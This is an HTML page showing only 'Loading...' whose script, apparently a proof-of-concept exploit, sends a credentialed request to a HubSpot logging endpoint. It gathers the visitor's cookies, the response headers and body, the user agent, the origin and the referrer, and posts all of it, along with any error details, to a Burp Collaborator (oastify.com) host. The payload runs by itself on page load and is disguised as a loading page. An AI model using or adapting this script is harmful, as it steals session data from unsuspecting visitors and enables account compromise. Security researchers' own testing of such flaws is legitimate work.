<!DOCTYPE html>

<body>
    <h1>Loading...</h1>
    <script>
    (function() {
        // 1. First, send request to HubSpot with credentials
        fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify([{
                event: 'page_view',
                properties: {
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                }
            }])
        })
        .then(response => {
            // Get Set-Cookie headers from response
            var setCookieHeaders = response.headers.get('Set-Cookie') || 'No Set-Cookie header';
            
            // Get all response headers
            var allHeaders = {};
            response.headers.forEach((value, key) => {
                allHeaders[key] = value;
            });
            
            return response.text().then(data => {
                return {
                    status: response.status,
                    statusText: response.statusText,
                    data: data,
                    setCookie: setCookieHeaders,
                    allHeaders: allHeaders,
                    url: response.url
                };
            });
        })
        .then(result => {
            // Try to get cookies from document (if any non-HttpOnly exist)
            var docCookies = document.cookie || "No document.cookie (all HttpOnly)";
            
            // Get all cookies from document.cookie and also try to extract from response
            var payload = {
                doc_cookies: docCookies,
                set_cookie_header: result.setCookie,
                all_response_headers: result.allHeaders,
                response_status: result.status,
                response_data: result.data.substring(0, 500), // First 500 chars
                response_url: result.url,
                origin: window.location.origin,
                userAgent: navigator.userAgent,
                referrer: document.referrer || 'No referrer',
                timestamp: new Date().toISOString(),
                note: "HttpOnly cookies cannot be read by JavaScript. They are only sent automatically in requests."
            };
            
            // Send to Collaborator
            return fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
        })
        .then(() => {
            console.log('[+] Data sent to Collaborator!');
        })
        .catch(error => {
            console.log('[-] Error:', error);
            fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    error: error.toString(),
                    errorStack: error.stack,
                    origin: window.location.origin,
                    timestamp: new Date().toISOString()
                })
            });
        });
    })();
    </script>
